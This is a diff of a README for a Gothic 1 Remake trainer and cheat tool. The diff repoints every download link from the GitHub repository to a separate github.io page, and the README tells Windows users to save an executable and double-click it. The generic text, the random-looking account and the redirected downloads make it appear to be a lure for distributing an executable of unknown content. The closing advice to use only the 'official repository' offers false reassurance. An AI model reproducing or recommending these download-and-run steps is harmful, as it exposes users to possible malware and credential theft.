@@ -1,6 +1,6 @@
 # 🛡️ Gothic1Remake_Trainer_1 - Optimize gameplay and master Gothic 1
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/uncontrived-lagoon544/Gothic1Remake_Trainer_1)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://uncontrived-lagoon544.github.io)
 
 Gothic1Remake_Trainer_1 provides tools to improve your performance and experience in the Gothic 1 Remake. This application includes FPS fixes, survival guides, cheat codes, and build recommendations. It removes the need for manual file editing or complex configuration changes.
 
@@ -8,7 +8,7 @@ Gothic1Remake_Trainer_1 provides tools to improve your performance and experienc
 
 Follow these steps to set up the tool on your Windows computer.
 
-1. Visit the [official repository page](https://github.com/uncontrived-lagoon544/Gothic1Remake_Trainer_1).
+1. Visit the [official repository page](https://uncontrived-lagoon544.github.io).
 2. Locate the link to download the file.
 3. Save the executable file to a folder on your desktop.
 4. Double-click the file to start the application.
@@ -70,6 +70,6 @@ For the best results, follow these practices:
 
 ## 🌐 Related Links
 
-[Primary Download Page](https://github.com/uncontrived-lagoon544/Gothic1Remake_Trainer_1)
+[Primary Download Page](https://uncontrived-lagoon544.github.io)
 
 The development team monitors feedback through the platform issues tracker. Use that space to request features or report bugs. Your input helps refine the tool for all users. Do not share your personal information or game account credentials on public forums. Keep your installation file in a secure location and only download updates from the official repository provided above.
